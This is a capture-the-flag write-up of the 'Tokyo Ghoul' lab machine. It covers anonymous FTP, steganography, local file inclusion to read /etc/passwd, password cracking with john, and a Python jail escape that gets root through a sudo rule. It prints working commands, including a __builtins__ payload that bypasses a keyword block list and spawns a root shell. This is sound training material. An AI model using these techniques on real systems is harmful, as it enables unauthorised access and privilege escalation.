# **_Tokyo Ghoul - Writeup_**

![Image](https://github.com/user-attachments/assets/6594f60d-817a-49c7-ad21-e61ae0cf25e5)


**Tokyo Ghoul** is an anime/manga-themed room where the main character, Kaneki, is in danger and needs to be rescued. This easy yet technical machine focuses on systematic enumeration, identifying weak credentials, and performing basic Linux privilege escalation, reinforcing core penetration testing methodologies.

### INFOs
* Difficulty: Medium
* Operating System: Linux
* Attack Type: Service enumeration → Credential discovery → Web exploitation → Python jail escape → Linux privilege escalation

## Enumeration

### Nmap Scan

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.139.49
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
|_  256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Tokyo goul
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

***Task 2 - Where i am***

_Q1.Use nmap to scan all ports - ```no answer needed```_

_Q2.How many ports are open ? - ```3```_

_Q3.What is the OS used ? - Using Wappalazer ```Ubuntu```_


Check the Website (Port 80):


<img width="1680" height="1013" alt="Image" src="https://github.com/user-attachments/assets/a183e023-b31e-4be0-ab65-7517acad52e6" />

Click the Link in the Text that redirect to another file

<img width="1680" height="908" alt="Image" src="https://github.com/user-attachments/assets/f7e5c186-2086-44ae-ba06-697b133a97ab" />

The page source was reviewed there is  #COMMENT in it 

```<!-- look don't tell jason but we will help you escape , here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there you will find a freind who will help you -->```

It Gives the hint of FTP Anonymous login already we know it from the Nmap Scan .

```
Connected to 10.67.170.208.
220 (vsFTPd 3.0.3)
Name (10.67.170.208:sudhar): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||42563|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 ..
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
226 Directory send OK.
ftp> cd need_Help?
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||48604|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           480 Jan 23  2021 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2021 Talk_with_me
226 Directory send OK.
ftp> get Aogiri_tree.txt
local: Aogiri_tree.txt remote: Aogiri_tree.txt
229 Entering Extended Passive Mode (|||40198|)
150 Opening BINARY mode data connection for Aogiri_tree.txt (480 bytes).
100% |*****************************************************************************************************************************************************************|   480      122.93 KiB/s    00:00 ETA
226 Transfer complete.
480 bytes received in 00:00 (1.43 KiB/s)
ftp> cd Talk_with_me
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||40293|)
150 Here comes the directory listing.
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23  2021 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23  2021 rize_and_kaneki.jpg
226 Directory send OK.
ftp> get need_to_talk
local: need_to_talk remote: need_to_talk
229 Entering Extended Passive Mode (|||47782|)
150 Opening BINARY mode data connection for need_to_talk (17488 bytes).
100% |*****************************************************************************************************************************************************************| 17488       37.01 KiB/s    00:00 ETA
226 Transfer complete.
17488 bytes received in 00:00 (21.62 KiB/s)
ftp> get rize_and_kaneki.jpg
local: rize_and_kaneki.jpg remote: rize_and_kaneki.jpg
229 Entering Extended Passive Mode (|||46700|)
150 Opening BINARY mode data connection for rize_and_kaneki.jpg (46674 bytes).
100% |*****************************************************************************************************************************************************************| 46674       57.19 KiB/s    00:00 ETA
226 Transfer complete.
46674 bytes received in 00:01 (40.37 KiB/s)
ftp> exit
221 Goodbye.
                                                                
```
We Got the files ...  in the ``` Aogiri_tree.txt ```

```
Why are you so late?? i've been waiting for too long .
So i heard you need help to defeat Jason , so i'll help you to do it and i know you are wondering how i will. 
I knew Rize San more than anyone and she is a part of you, right?
That mean you got her kagune , so you should activate her Kagune and to do that you should get all control to your body , i'll help you to know Rise san more and get her kagune , and don't forget you are now a part of the Aogiri tree .
Bye Kaneki.

```

another file ```need_to_talk``` is the executable file so we set the -x file permission to it and run .

```
 ./need_to_talk       
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> help
Hmm. I don't think this is what I was looking for.
Take a look inside of me. rabin2 -z
```

Simply it asking the password its check if correct it gives some hint or return after the reverse engineering the file . We have the tool called ```ltrace``` for checking it has been compare the input with the valid answer it will helpful 

```
sleep(1)                                                                                                                       = 0
printf("> "> )                                                                                                                   = 2
fgets(help
"help\n", 255, 0x7f5e3fe158e0)                                                                                           = 0x7fffd519d330
strlen("help\n")                                                                                                               = 5
strcmp("help", "kamishiro")    
```

We find the compare and try again with the valid value ... its return the hint
```
$ ./need_to_talk       
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> kamishiro
Good job. I believe this is what you came for:
You_found_1t

```

Checks another file ```rize_and_kaneki.jpg``` its the image file use the Exiftool but nothing interesting ... Do the Stegonography 

```
 steghide --extract -sf rize_and_kaneki.jpg 
Enter passphrase: 
wrote extracted data to "yougotme.txt".
```

_**Task 3 - Planning for escape**_

_Q1.Did you find the note that the others ghouls gave you? where did you find it ? - ```jasonroom.html```_

_Q2.What is the key for Rize executable? - ```kamishiro```_

_Q3.Use a tool to get the other note from Rize -- No answers needed_

For extrating the hidden file use the passphrase of we found in the previous file ... in the yougotme.txt have the mouse code decrpt it with the Cyberchef After decrpting the mouse code ```d1r3c70ry_center``` 

<img width="1680" height="1013" alt="Image" src="https://github.com/user-attachments/assets/87d43d66-d1ad-4a78-9a84-b63ad4ea2982" />

its tell the Scan for it So do the Directory Scan (Gobuster)

```/claim              (Status: 200) [Size: 314] [--> http://10.66.183.125/d1r3c70ry_center/claim]```

## Exploitation

<img width="1680" height="1015" alt="Image" src="https://github.com/user-attachments/assets/9f94a669-f851-4fd8-afe5-2612f02ba955" />

Explore the site nothing interesting So tried the LFI attack not success but using the url encoded after tried got something intresting 

<img width="1680" height="297" alt="Image" src="https://github.com/user-attachments/assets/efd80971-297a-4ab5-a87b-c0c74d667d23" />

This indicated potential LFI behavior so we keep digging for the passwd file 

<img width="1680" height="816" alt="Image" src="https://github.com/user-attachments/assets/3a340669-742d-4ed8-864c-40e9bcc59586" />

Save the hash in the file and decrpt of it 

```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (kamishiro)

```
_**Task 4 - What Rize is trying to say ?**_

_Q1.What the message mean did you understand it ? what it says? - ```d1r3c70ry_center```_

_Q2.Can you see the weakness in the dark ? no ? just search - No answer needed_

_Q3.What did you find something ? crack it - No answer needed_

_Q4.what is rize username ? - ```kamishiro```_

_Q5.what is rize password ? - ```password123```_

Successfully got the username and password . Logged to the SSH 

```
kamishiro@vagrant:~$ whoami
kamishiro
kamishiro@vagrant:~$ ls -al
total 16
drwxr-xr-x 2 root root 4096 Jan 23  2021 .
drwxr-xr-x 4 root root 4096 Jan 23  2021 ..
-rw-r--r-- 1 root root  588 Jan 23  2021 jail.py
-rw-r--r-- 1 root root   33 Jan 23  2021 user.txt
kamishiro@vagrant:~$ cat user.txt 
e62#############################

```
We Successfully obtained the User.txt ✨

## Privilege Escalation

```
kamishiro@vagrant:~$ cat jail.py 
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
kamishiro@vagrant:~$ sudo -l
[sudo] password for kamishiro: 
Matching Defaults entries for kamishiro on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
```
_**Python Jailbreak**_

The file jail.py is a Python jail, meaning it attempts to restrict what code a user can execute.
The script blocks common dangerous keywords such as import, os, system, exec, and eval by checking user input before execution.

However, the restriction is keyword-based, not logic-based.

Python automatically exposes a special object called __builtins__, which contains references to core Python functions, including __import__.
Although the keyword import is blocked, it can still be accessed indirectly through __builtins__.

By dynamically reconstructing blocked keywords using string manipulation (e.g., '__IMPORT__'.lower()), it is possible to bypass the filter.

The following payload:

Accesses __import__ indirectly

Imports the pty module

Spawns a fully interactive /bin/bash shell

Executes as root because the script is allowed via sudo

```__builtins__.__dict__['__IMPORT__'.lower()]('PTY'.lower()).__dict__['SPAWN'.lower()]('/bin/bash')```

after futher research the python jail break attempted . first run the file as sudo as kamishiro 
```

sudo python3 /home/kamishiro/jail.py 
[sudo] password for kamishiro: 
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('PTY'.lower()).__dict__['SPAWN'.lower()]('/bin/bash')
root@vagrant:~# whoami
root
root@vagrant:~# cd ..
root@vagrant:/home# ls
kamishiro  vagrant
root@vagrant:/home# cd ..
root@vagrant:/# ls
bin   dev   initrd.img      lib64       mnt   root  snap  tmp      var
boot  etc   initrd.img.old  lost+found  opt   run   srv   usr      vmlinuz
data  home  lib             media       proc  sbin  sys   vagrant  vmlinuz.old
root@vagrant:/# cd root
root@vagrant:/root# ls
root.txt
root@vagrant:/root# cat root.txt 
9d7#############################

```
![Image](https://github.com/user-attachments/assets/ad010591-f220-4d15-a4eb-83908fa4a0a7)

We successfull obtained the root access and root.txt 💥

